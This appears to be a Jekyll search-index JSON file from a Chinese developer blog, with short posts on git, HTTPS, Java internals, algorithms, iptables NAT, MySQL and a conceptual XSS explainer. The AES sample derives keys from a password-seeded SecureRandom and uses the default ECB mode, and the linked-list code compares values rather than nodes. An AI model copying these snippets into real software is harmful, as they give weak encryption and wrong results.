      "content": "git fetch / git pull 区别 git fetch ` 更新远程repo 'origin', remote branch ‘master' git fetch origin master 从remote branch 'master' merge 内容到当前本地分支 git merge origin/master ` git pull 相当于上面的git fetch + git merge两步， 可能要人工处理代码冲突 ",
      "url"      : "http://localhost:4000/2017/08/27/git-fetch/"
    } ,
  
    {
      "title"    : "Git Rebase",
      "category" : "",
      "content": "git rebase / merge 区别 git rebase rebase操作的具体过程为： 确保工作区位于dev分支上：git checkout dev 执行衍合操作：git rebase master 如果有冲突需要先解决冲突，解决完冲突之后执行：git rebase --continue 如果想放弃这次操作可以执行：git rebase --abort 如果是想直接使用master分支取代此分支，可以执行：git rebase --skip 这些命令会把你的&quot;dev&quot;分支里的每个提交(commit)取消掉，并且把它们临时保存为补丁(patch)(这些补丁放到&quot;.git/rebase&quot;目录中),然后把&quot;dev&quot;分支更新为最新的&quot;master&quot;分支，最后把保存的这些补丁应用到&quot;dev&quot;分支上。 git merge 使用merge时在dev分支中的提交不会发生变化，这对于有其他人使用次分支时很重要，但是这个操作会产生一个合并提交，因此在将特性分支合并到主干master上时一般不使用merge ",
      "url"      : "http://localhost:4000/2017/08/27/git-rebase/"
    } ,
  
    {
      "title"    : "Test Metadata",
      "category" : "",
      "content": "Test Great! We need not to provide the metadata info. title,date will be set by default ",
      "url"      : "http://localhost:4000/2017/08/27/test-metadata/"
    } ,
  
    {
      "title"    : "Wish",
      "category" : "",
      "content": "wishes everything looks good! But when can I have a android app for posting my github pages? publish Dear, how can I publish my change? ",
      "url"      : "http://localhost:4000/2017/08/27/wish/"
    } ,
  
    {
      "title"    : "https",
      "category" : "architect",
      "content": "摘自：http://blog.csdn.net/wangjun5159/article/details/51510594 客户端发送请求到服务器端 服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在 客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端 服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端 客户端使用共享密钥解密数据 SSL加密建立 支付宝涉及到金融，所以出于安全考虑采用https这个，可以理解，为什么百度、知乎等也采用这种方式？为了防止运营商劫持！http通信时，运营商在数据中插入各种广告，用户看 ",
      "url"      : "http://localhost:4000/2017/08/27/https-conn/"
    } ,
  
    {
      "title"    : "java如何通过反射获取方法参数名",
      "category" : "jdk",
      "content": "参考：http://blog.csdn.net/revitalizing/article/details/71036970 Spring实现-通过spring的LocalVariableTableParameterNameDiscoverer spring mvc 方法参数绑定请求路径参数 如果不用Class，而是通过spring注入的实例，然后instance.getClass.getDeclaredMethods()则无法得到参数名，调试时看到方法名称是通过jdk代理过的， 拿不到参数名 通过Java8的Parameter类 在Java 8之前的版本，代码编译为class文件后，方法参数的类型是固定的，但参数名称却丢失了，这和动态语言严重依赖参数名称形成了鲜明对比。 现在，java 8开始在class文件中保留参数名，给反射带来了极大的便利。jdk8增加了类Parameter 如果编译级别低于1.8，得到的参数名称是无意义的arg0、arg1…… 遗憾的是，保留参数名这一选项由编译开关javac -parameters打开，默认是关闭的。 注意此功能必须把代码编译成1.8版本的class才行。 ",
      "url"      : "http://localhost:4000/2017/08/27/reflect-method-name/"
    } ,
  
    {
      "title"    : "Rpc Ideponent",
      "category" : "midware",
      "content": "幂等性 f(x)=f(f(x)) TCP TCP协议能够保证幂等的核心在于sequence number字段，一个序列号的在较长的一段时间内均不会出现重复。 应用层 对于应用层的协议设计，原理和TCP是类似的，我们需要一个不重复的序列号。再简单一点说，在一个业务流程的处理中，我们需要一个不重复的业务流水号，以保证幂等性。比如DB表中的UK自动（业务id） RPC调用方／服务方 TCC ",
      "url"      : "http://localhost:4000/2017/08/27/rpc-ideponent/"
    } ,
  
    {
      "title"    : "Arrays Sort In Jdk",
      "category" : "",
      "content": "参考 Arrays.sort jdk7以前用的是merge sort（长度&lt;7时用insert sort）；jdk7以后用的是timsort（优化后的merge sort） timsort对比较元素要求更严格，需要满足下面的语义： sgn(compare(x, y)) == -sgn(compare(y, x)) (compare(x, y)&gt;0) &amp;&amp; (compare(y, z)&gt;0) 意味着 compare(x, z)&gt;0 compare(x, y)==0 意味着对于任意的z：sgn(compare(x, z))==sgn(compare(y, z)) 均成 一个破坏上面语义的例子是： ` public int compare(Test o1, Test o2) { return o1.getValue() &gt; o2.getValue() ? 1 : -1; ` 正确的比较方法是： public int compare(Test o1, Test o2) { return o1.getValue() == o2.getValue() ? 0 : (o1.getValue() &gt; o2.getValue() ? 1 : -1）; } Collections.sort 内部调用的也是Arrays.sort ",
      "url"      : "http://localhost:4000/2017/08/28/Arrays-sort-in-JDK/"
    } ,
  
    {
      "title"    : "Algo Ugly Number",
      "category" : "",
      "content": "丑数：只能因式分解为2，3，5整除的数 算法：求第index个丑数 常规思维 依次遍历，判断每个数是否为丑数。确定是效率低，存在大量重复计算。 public boolean Ugly(int N) { &lt;span class=&quot;c1&quot;&gt;//判断N是否只含有质因子2,3,5中的几个&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//判断是否有质因子2&lt;/span&gt;  t&lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//如果N中含有质因子2，把所有的因子2都去掉&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//执行完上一个while,判断是否有质因子3&lt;/span&gt;  t&lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//如果N中含有质因子3，把所有的因子3都去掉&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//执行完上两个while,判断是否有质因子5&lt;/span&gt;  t&lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//如果N中含有质因子5，把所有的因子5都去掉&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//如果最后N除的只剩1，则N就是丑数&lt;/span&gt; } 优化方法 参考 利用前面计算的丑数序列，* 2，* 3，* 5取最小值为下一个丑数。 import java.util.*;   public class Solution {  // 求第index个丑数     public int GetUglyNumber_Solution(int index) {         if(index&lt;=0)             return 0;         ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();         //add进第一个丑数1         list.add(1);         //三个下标用于记录丑数的位置         int i2=0,i3=0,i5=0;         while(list.size()&lt;index){             //三个数都是可能的丑数，取最小的放进丑数数组里面             int n2=list.get(i2)*2;             int n3=list.get(i3)*3;             int n5=list.get(i5)*5;             int min = Math.min(n2,Math.min(n3,n5));             list.add(min);             if(min==n2)                 i2++;             if(min==n3)                 i3++;             if(min==n5)                 i5++;         }         return list.get(list.size()-1);     } } ",
      "url"      : "http://localhost:4000/2017/08/29/algo-ugly-number/"
    } ,
  
    {
      "title"    : "Algo Linked List Cycle",
      "category" : "",
      "content": "链表是否有环以及环的第一个入口点 链表是否有环 快慢指针，最终会相遇到环上的某个节点上。否则快指针直接到空节点。 有环链表第一个入口点 分别从链表头和上面环上相遇的节点开始步长为1的遍历，下一次相遇的节点为环的第一个入口点。理论分析 当fast与slow相遇时，slow肯定没有走遍历完链表，而fast已经在环内循环了n圈(1 &lt;= n)。假设slow走了s步，则fast走了2s步（fast步数还等于s 加上在环上多转的n圈），设环长为r，则： 2s = s + nr s= nr 设整个链表长L，入口环与相遇点距离为x，起点到环入口点的距离为a。 a + x = nr a + x = (n – 1)r +r = (n-1)r + L - a (L – a – x)为相遇点到环入口点的距离，由此可知，从链表头到环入口点a等于(n-1)循环内环+相遇点到环入口点 a = (n-1)r + (L – a – x) 两个链表第一个相交节点 首先判断两个链表是否有环，根据上面的算法。 case1: 两个链表都无环 方法1: 链表1的节点地址hash，遍历链表2是否有相同地址的节点 方法2: ** 先判断是否相交（最后一个节点是否相同） ** 求两个链表的长度 ** 长的链表先走diff步，两个链表再同时前进（步长为1），第一个相同的节点是交点 方法3: 两个链表连成一个环，问题转化为求环的第一个入口点 维护两个指针pA和pB，初始分别指向A和B。然后让它们分别遍历整个链表，每步一个节点。当pA到达链表末尾时，让它指向B的头节点；类似的当pB到达链表末尾时，重新指向A的头节点。如果pA在某一点与pB相遇，则pA或pB就是交点 # Definition for singly-linked list.  #class ListNode:  #  def __init__(self, x):  #  self.val = x  #  self.next = None class Solution:  # @param two ListNodes  # @return the intersected ListNode  def getIntersectionNode(self, headA, headB):  pA = headA  pB = headB  if headA == None or headB == None:   return  while pA and pB:   if pA.val != pB.val:    if pA.next and pB.next:    pA = pA.next    pB = pB.next    elif pA.next == None and pB.next != None:    pA = headB    pB = pB.next    elif pB.next == None and pA.next != None:    pA = pA.next    pB = headA    else:    return   else:    return pA case2: 一个链表有环，另外一个没有 不可能相交 case3: 两个链表共享一个环 先根据是否有环算法找到两个链表的环上位置pos1，pos2 分别求两个链表到pos1，pos2的长度 diff长度，长的链表先走diff长度，再同时前进找到第一个相同节点 ",
      "url"      : "http://localhost:4000/2017/08/30/algo-linked-list-cycle/"
    } ,
  
    {
      "title"    : "Securerandom Aes",
      "category" : "",
      "content": "AES 加密 /** * 加密 * * @param content 需要加密的内容 * @param password 加密密码 * @return */ public static byte[] encrypt(String content, String password) {   try {     KeyGenerator kgen = KeyGenerator.getInstance(AES);    kgen.init(128, new SecureRandom(password.getBytes()));    SecretKey secretKey = kgen.generateKey();    byte[] enCodeFormat = secretKey.getEncoded();    SecretKeySpec key = new SecretKeySpec(enCodeFormat, AES);    Cipher cipher = Cipher.getInstance(AES);// 创建密码器    byte[] byteContent = content.getBytes(utf-8);    cipher.init(Cipher.ENCRYPT_MODE, key);// 初始化    byte[] result = cipher.doFinal(byteContent);    return result; // 加密   } catch (NoSuchAlgorithmException e) {    e.printStackTrace();   } catch (NoSuchPaddingException e) {    e.printStackTrace();   } catch (InvalidKeyException e) {    e.printStackTrace();   } catch (UnsupportedEncodingException e) {    e.printStackTrace();   } catch (IllegalBlockSizeException e) {    e.printStackTrace();   } catch (BadPaddingException e) {    e.printStackTrace();   }   return null; } AES解密 /**解密 * @param content 待解密内容 * @param password 解密密钥 * @return */ public static byte[] decrypt(byte[] content, String password) {   try {    KeyGenerator kgen = KeyGenerator.getInstance(AES);    kgen.init(128, new SecureRandom(password.getBytes()));    SecretKey secretKey = kgen.generateKey();    byte[] enCodeFormat = secretKey.getEncoded();    SecretKeySpec key = new SecretKeySpec(enCodeFormat, AES);      Cipher cipher = Cipher.getInstance(AES);// 创建密码器    cipher.init(Cipher.DECRYPT_MODE, key);// 初始化    byte[] result = cipher.doFinal(content);    return result; // 加密   } catch (NoSuchAlgorithmException e) {    e.printStackTrace();   } catch (NoSuchPaddingException e) {    e.printStackTrace();   } catch (InvalidKeyException e) {    e.printStackTrace();   } catch (IllegalBlockSizeException e) {    e.printStackTrace();   } catch (BadPaddingException e) {    e.printStackTrace();   }   return null; } 分析 该加解密算法SecureRandom存在坑。在不同平台window／linux，不同jdk 6/7/8， 不同系统配置时多台分布式服务器参加加解密时可能会出现：在一台服务加密的文件在另外一台服务器上不能解密。 原因跟SecureRandom实现的PRNG随机算法有关。PRNG是Java加密服务提供商（CSP）的一部分。在Sun的Java实现中，默认情况下使用SUN CSP。在Windows上，SUN CSP默认使用在sun.security.provider.SecureRandom中实现的SHA1PRNG。在Solaris和Linux上，SUN CSP默认是使用sun.security.provider.NativePRNG，它只提供操作系统提供的/dev/urandomPRNG 的输出。 经测试，指定SecureRandom算法SHA1PRNG没有问题。在我们环境（linux／jdk6/8）中没有显式指定默认走NativePRNG。SecureRandom默认算法选择逻辑： static void More ...putEntries(Map&lt;Object, Object&gt; map) { 86 87  /* 88  * SecureRandom 89  * 90  * Register these first to speed up new SecureRandom(), 91  * which iterates through the list of algorithms 92  */ 93  // register the native PRNG, if available 94  // if user selected /dev/urandom, we put it before SHA1PRNG, 95  // otherwise after it 96  boolean nativeAvailable = NativePRNG.isAvailable(); 97  boolean useNativePRNG = seedSource.equals(URL_DEV_URANDOM) || 98   seedSource.equals(URL_DEV_RANDOM); 99 100  if (nativeAvailable &amp;&amp; useNativePRNG) { 101  map.put(SecureRandom.NativePRNG, 102   sun.security.provider.NativePRNG); 103  } 104  map.put(SecureRandom.SHA1PRNG, 105   sun.security.provider.SecureRandom); 106  if (nativeAvailable &amp;&amp; !useNativePRNG) { 107  map.put(SecureRandom.NativePRNG, 108   sun.security.provider.NativePRNG); 109  }  t &lt;span class=&quot;o&quot;&gt;......&lt;/span&gt; 从上面可以看出，linux下指定了/dev/urandom或者/dev/random采用优先级高的NativePRNG。否则SHA1PRNG优先级高。 至于通过-Djava.security.egd=file:/dev/./urandom 而不是 file:/dev/urandom 那又是另外一个忧伤的故事。http://blog.csdn.net/raintungli/article/details/42876073 ",
      "url"      : "http://localhost:4000/2017/08/31/SecureRandom-AES/"
    } ,
  
    {
      "title"    : "Netfilter Snat Dnat",
      "category" : "",
      "content": "SNAT/DNAT 图中正菱形的区域是对数据包进行判定转发的地方。在这里，系统会根据IP数据包中的destination ip address中的IP地址对数据包进行分发。如果destination ip adress是本机地址，数据将会被转交给INPUT链。如果不是本机地址，则交给FORWARD链检测。 这也就是说，我们要做的DNAT要在进入这个菱形转发区域之前，也就是在PREROUTING链中做，比如我们要把访问202.103.96.112的访问转发到192.168.0.112上： iptables -t nat -A PREROUTING -d 202.103.96.112 -j DNAT --to-destination 192.168.0.112 而SNAT自然是要在数据包流出这台机器之前的最后一个链也就是POSTROUTING链来进行操作 iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT --to-source 58.20.51.66 ",
      "url"      : "http://localhost:4000/2017/09/02/netfilter-snat-dnat/"
    } ,
  
    {
      "title"    : "Hdfs Ha",
      "category" : "",
      "content": "HDFS NameNode ZK选主 HDFS 共享存储QJM ",
      "url"      : "http://localhost:4000/2017/09/12/hdfs-ha/"
    } ,
  
    {
      "title"    : "Comment",
      "category" : "",
      "content": "How to add comment page in github io page? 第三方评论平台“友言”，http://www.uyan.cc/getcode ",
      "url"      : "http://localhost:4000/2017/09/22/comment/"
    } ,
  
    {
      "title"    : "Jvm Gc",
      "category" : "",
      "content": "CMS -&gt; Full GC concurrent mode failure CMS - 响应时间优先GC 初始标记 并发标记 并发预清理，改变当运行第二阶段时，由应用程序线程产生的对象引用，以更新第二阶段的结果 重标记，暂停应用重新标记 并发清理 并发重置 -XX：+UseConcMarkSweepGC -XX：UseParNewGC -XX：+CMSConcurrentMTEnabled -XX：ConcGCThreads -XX:CMSInitiatingOccupancyFraction -XX:+CMSClassUnloadingEnabled -XX:+ExplicitGCInvokesConcurrent -XX:+ExplicitGCInvokesConcurrentAndUnloadsClasses -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps 打印JVM参数 # 500+参数 java -client -XX:+PrintFlagsFinal TestClass # 700+参数，更多 java -server -XX:+UnlockExperimentalVMOptions -XX:+UnlockDiagnosticVMOptions -XX:+PrintFlagsFinal TestClass # 用户设置的参数 java -server -XX:+PrintCommandLineFlags TestClass 吞吐量优先GC -XX:+USEPARALLELGC -XX:+USEPARALLELOLDGC -XX:PARALLELGCTHREADS 并发编程网 ",
      "url"      : "http://localhost:4000/2017/10/01/jvm-gc/"
    } ,
  
    {
      "title"    : "Mysql",
      "category" : "",
      "content": "MySQL MySQL复制性能 MySQL5.6 以后，提供了基于 GTID 开启多线程并行复制的方案，即每个库有一个单独的(sql thread) 在 mysql5.6 里，无须再知道 binlog 和 POS 点，需要知道 master 的 IP、端口，账号密码即可，因为同步复制是自动的，mysql 通过内部机制 GTID 自动找点同步 MySQL 5.7的并行复制建立在group commit的基础上。MySQL5.7当中，组提交是默认开启的 MySQL 隔离级别 MySQL - Repeatable Read Oracle - Read Committed SQL Server - Read Committed MySQL XA事务 MySQL XA分为两类，内部XA与外部XA 内部XA用于同一server实例下跨多个Innodb引擎的事务，由大家熟悉的Binlog作为协调者(解决了 binlog 和 redo log的一致性问)； 外部XA用于跨多MySQL实例的分布式事务，需要应用层介入作为协调者(崩溃时的悬挂事务，全局提交还是回滚，需要由应用层决定，对应用层的实现要求较高) 在MySQL5.7.7之前，外部XA事务是有bug的。binlog不写prepare日志，只写commit日志。考虑下面的场景：所有的参与节点prepare完成，在进行xa commit前crash。crash recover如果选择commit此事务。由于binlog在prepare阶段未写，因此主库中看来，此分布式事务最终提交了，但是此事务的操作并未写到binlog中，因此也就未能成功复制到备库，从而导致主备库数据不一致的情况出现。 ",
      "url"      : "http://localhost:4000/2017/10/02/mysql/"
    } ,
  
    {
      "title"    : "Github Pagination",
      "category" : "",
      "content": "github pages如何支持分页 jekyll官方有支持github pages分页的插件jekyll-paginate. 官方参考[pagination](seesea2024.github.io localhost).配置起来不难，但中间有一些坑，假期折腾我一两天。 ###编辑 Gemfile group :jekyll_plugins do gem &quot;jekyll-feed&quot;, &quot;~&gt; 0.6&quot; gem &quot;jekyll-paginate&quot; end ###编辑 _config.yml 这里比较坑的地方是必须建立一个/blog(站点根目录下）和index.html. pagination 原理上是把index.html中从_posts目录下抓取的文件进行分页。 paginate: 10 paginate_path: &quot;/blog/page:num/&quot; 编辑 /blog/index.html 主要／blog目录下面 一定 要有index.html,否则分页功能无效。 --- layout: default --- {% include page.html %} 编辑 _includes/page.html &lt;!-- This loops through the paginated posts --&gt; {% for post in paginator.posts %} &lt;h1&gt;&lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/h1&gt; {% endfor %} {% if paginator.total_pages &gt; 1 %} &lt;div class=&quot;pagination&quot;&gt; {% if paginator.previous_page %} &lt;a href=&quot;{{ paginator.previous_page_path | prepend: site.baseurl | replace: '//', '/' }}&quot;&gt;&amp;laquo; Prev&lt;/a&gt; {% else %} &lt;span&gt;&amp;laquo; Prev&lt;/span&gt; {% endif %} {% for page in (1..paginator.total_pages) %} {% if page == paginator.page %} &lt;em&gt;{{ page }}&lt;/em&gt; {% elsif page == 1 %} &lt;a href=&quot;{{ paginator.previous_page_path | prepend: site.baseurl | replace: '//', '/' }}&quot;&gt;{{ page }}&lt;/a&gt; {% else %} &lt;a href=&quot;{{ site.paginate_path | prepend: site.baseurl | replace: '//', '/' | replace: ':num', page }}&quot;&gt;{{ page }}&lt;/a&gt; {% endif %} {% endfor %} {% if paginator.next_page %} &lt;a href=&quot;{{ paginator.next_page_path | prepend: site.baseurl | replace: '//', '/' }}&quot;&gt;Next &amp;raquo;&lt;/a&gt; {% else %} &lt;span&gt;Next &amp;raquo;&lt;/span&gt; {% endif %} &lt;/div&gt; {% endif %} 编辑 _includes/header.html 这个对应posts单个页面上返回列表页面的链接。因为列表页地址现在多了一个blog。 &lt;a class=&quot;site-title&quot; href=&quot;/blog&quot;&gt;老实记&lt;/a&gt; 中间有jekyll版本冲突问题，通过sudo bundle update解决。good luck！ ",
      "url"      : "http://localhost:4000/2017/10/04/github-pagination/"
    } ,
  
    {
      "title"    : "Jersey Wadl",
      "category" : "",
      "content": "Spring Jersey web.xml config &lt;servlet&gt;   &lt;servlet-name&gt;service&lt;/servlet-name&gt;   &lt;servlet-class&gt;com.sun.jersey.spi.spring.container.servlet.SpringServlet&lt;/servlet-class&gt;   &lt;init-param&gt;   &lt;param-name&gt;com.sun.jersey.config.property.packages&lt;/param-name&gt;   &lt;param-value&gt;com.stone.webservice&lt;/param-value&gt;   &lt;/init-param&gt;   &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;   &lt;servlet-name&gt;service&lt;/servlet-name&gt;   &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt; wadl URL 访问地址：http://ip:port/xxx-app/service/application.wadl ",
      "url"      : "http://localhost:4000/2017/10/29/jersey-wadl/"
    } ,
  
    {
      "title"    : "Java Securerandom",
      "category" : "",
      "content": "Java 随机数生成 在Linux操作系统中，有一个特殊的设备文件，可以用作随机数发生器或伪随机数发生器。 /dev/random 在读取时，/dev/random设备会返回小于熵池噪声总数的随机字节。/dev/random可生成高随机性的公钥或一次性密码本。若熵池空了，对/dev/random的读操作将会被阻塞，直到从别的设备中收集到了足够的环境噪声为止。 当然你也可以设置成不堵塞，当你在open 的时候设置参数O_NONBLOCK， 但是当你read的时候，如果熵池空了，会返回-1 /dev/urandom /dev/random的一个副本是/dev/urandom （&quot;unlocked&quot;，非阻塞的随机数发生器[4]），它会重复使用熵池中的数据以产生伪随机数据。这表示对/dev/urandom的读取操作不会产生阻塞，但其输出的熵可能小于/dev/random的。它可以作为生成较低强度密码的伪随机数生成器，不建议用于生成高强度长期密码。 设置随机数生成方法 在JAVA中可以通过两种方式去设置指定的随机数发生器 -Djava.security.egd=file:/dev/random或者 -Djava.security.egd=file:/dev/urandom 修改配置文件java.security 在jvm_home  jre  lib  security 参数securerandom.source=file:/dev/urandom 哪怕设置了-Djava.security.egd=file:/dev/urandom,最后的结果一样是读取file:/dev/random if (egdSource.equals(URL_DEV_RANDOM) || egdSource.equals(URL_DEV_URANDOM)){ //走此分支都读/dev/random文件   try {    instance = new NativeSeedGenerator();    if (debug != null) {     debug.println(the instance:+instance.getClass());     debug.println(Using operating system seed generator);    }    } catch (IOException e) {    if (debug != null) {     debug.println(Failed to use operating system seed       + generator: + e.toString());    }    }   }  else if (egdSource.length() != 0) { // 读指定的file:/dev/./urandom 或者 file:/dev/../dev/urandom文件   try {    instance = new URLSeedGenerator(egdSource);    if (debug != null) {     debug.println(Using URL seed generator reading from       + egdSource);    }    } catch (IOException e) {    if (debug != null)     debug.println(Failed to create seed generator with       + egdSource + : + e.toString());    }   } 因此要这样设置：-Djava.security.egd=file:/dev/./urandom ",
      "url"      : "http://localhost:4000/2017/11/02/java-SecureRandom/"
    } ,
  
    {
      "title"    : "Web Xss",
      "category" : "",
      "content": "XSS cross site script 跨站脚本攻击。 原理 攻击者首先注入攻击脚本到第三方正规平台网站 受害用户点击链接后，会把网站cookie信息发送到hacker指定的URL。 hacker盗取到cookie后可以以受害者身份登陆 防范 HttpOnly cookie 如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击 提交值检查 过滤tag值&lt;script>、、 tag值长度 转码比如&lt;,&gt; ",
      "url"      : "http://localhost:4000/2017/11/05/web-xss/"
    } ,
  
    {
      "title"    : "Redis Type Encoding",
      "category" : "",
      "content": " ",
      "url"      : "http://localhost:4000/2017/12/03/redis-type-encoding/"
    } ,
  
    {
      "title"    : "Api Spi",
      "category" : "",
      "content": "API/SPI JAVA程序开发中经常说到API和SPI，它们之间究竟有什么区别呢？ API Application Programming Interface, 一些编程库暴露给开发者调用的接口就是API。一般需要调用者/客户端显式来调用。 SPI Service Provider Interface, 一般用在框架开发中。正常情况下开发者/客户端不需要关心。主要是方便框架或者系统的扩展性，比如通过实现不同的策略类，自定义类并通过配置文件等方式，动态加载这部分SPI类。如果是Java核心库比如JDBC Driver的SPI接口一般通过Java线程上下文加载器来加载。另外SPI实现类都是框架或者库用来回调的。 SPI实现 java.util.ServiceLoader方式加载SPI实现类 建立目录META-INF/services 以SPI接口全路径名为文件名，文件内容是SPI具体实现类 打jar包 测试项目引入jar 测试代码调用SPI实现类 //将服务声明的文件名称定义为: example.spi.service.IService，与接口名称一致，其中的内容包括： //example.spi.service.PrintServiceImpl //example.spi.service.EchoServiceImpl public static void main(String[] args) { //实例化具体类时需要注意对应类有无参构造函数 ServiceLoader&lt;Service&gt; serviceLoader = ServiceLoader.load(IService.class); &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IService&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serviceLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } spring factory loader SpringFactoriesLoader 读取文件 /META-INF/spring.factories List&lt;Foo&gt; foos = SpringFactoriesLoader.loadFactories(Foo.class, null); spring.factorie文件中key/value内容没有要求是接口名/实现。比如spring boot自动化配置中的key是org.springframework.boot.autoconfigure.EnableAutoConfiguration 而 values 是 @Configuration注解类 Dubbo ExtensionLoader Dubbo ExtensionLoader 对比 ServiceLoader 做了一些增强 dubbo约定扩展点配置文件放在classpath下的/META-INF/dubbo，/META-INF/dubbo/internal，/META-INF/services目录下，配置文件名为接口的全限定名，配置文件内容为配置名=扩展实现类的全限定名。 根据key加载实现类，不像ServiceLoader获取接口所有的实现类 增加了对扩展点IoC和AOP的支持，一个扩展点可以直接setter注入其它扩展点 ",
      "url"      : "http://localhost:4000/2017/12/24/api-spi/"
    } ,
  
    {
      "title"    : "Html2pdf",
      "category" : "",
      "content": "java package com.stone.service; import com.lowagie.text.DocumentException; import com.lowagie.text.pdf.BaseFont; import org.apache.commons.io.FileUtils; import org.springframework.stereotype.Service; import org.xhtmlrenderer.pdf.ITextFontResolver; import org.xhtmlrenderer.pdf.ITextRenderer; import java.io.*; /** Created by shidonghua on 2017/12/29. */ @Service public class Html2Pdf { public byte[] convert(String htmlStr) { ITextRenderer renderer = new ITextRenderer(); ITextFontResolver fontResolver = renderer.getFontResolver(); try { fontResolver.addFont(&quot;/Users/shidonghua/IdeaProjects/vm2pdf/src/main/resources/fonts/SimSun.ttf&quot;, BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED); //  fontResolver.addFont(&quot;STSong-Light&quot;, //    &quot;UniGB-UCS2-H&quot;,BaseFont.NOT_EMBEDDED); &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DocumentException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span 